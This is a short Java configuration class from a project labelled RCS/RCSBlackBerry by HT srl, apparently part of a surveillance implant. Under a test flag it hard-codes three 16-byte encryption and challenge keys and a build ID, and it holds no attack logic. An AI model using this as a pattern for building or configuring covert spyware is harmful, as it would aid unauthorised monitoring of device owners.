//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.config
 * File         : InstanceKeys323.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.config;

/**
 * The Class InstanceKeys323.
 */

public final class InstanceKeysFake implements InstanceKeysEmbedded {
    //#ifdef FAKECONF
	
	// RCS 10
	byte[] LogKey = new byte[]{ (byte)0x91, (byte)0x32, (byte)0xab, (byte)0x9e, (byte)0x6a, (byte)0x92, (byte)0xa3, (byte)0x15, (byte)0x82, (byte)0xc3, (byte)0xfa, (byte)0x7f, (byte)0x3f, (byte)0x74, (byte)0xe3, (byte)0xdb };
	byte[] ConfKey = new byte[] { (byte)0xef, (byte)0xbb, (byte)0xa0, (byte)0x0a, (byte)0xf1, (byte)0xcf, (byte)0x2b, (byte)0x83, (byte)0xa5, (byte)0x86, (byte)0x8b, (byte)0xf7, (byte)0xf7, (byte)0x89, (byte)0xba, (byte)0x4c };
	byte[] ProtoKey = new byte[]{ (byte)0x57, (byte)0x2e, (byte)0xbc, (byte)0x94, (byte)0x39, (byte)0x12, (byte)0x81, (byte)0xcc, (byte)0xf5, (byte)0x3a, (byte)0x85, (byte)0x13, (byte)0x30, (byte)0xbb, (byte)0x0d, (byte)0x99 };
	/**
     * Inject keysFake.
     */
    public void injectKeys(InstanceKeys keys) {
        keys.setAesKey(LogKey);
        keys.setChallengeKey(ProtoKey);
        keys.setBuildID("RCS_0000000010");
        keys.setConfKey(ConfKey);
    }

    public InstanceKeysFake() {
    }

    //#else
    public void injectKeys(InstanceKeys keys) {
    }
    //#endif
}
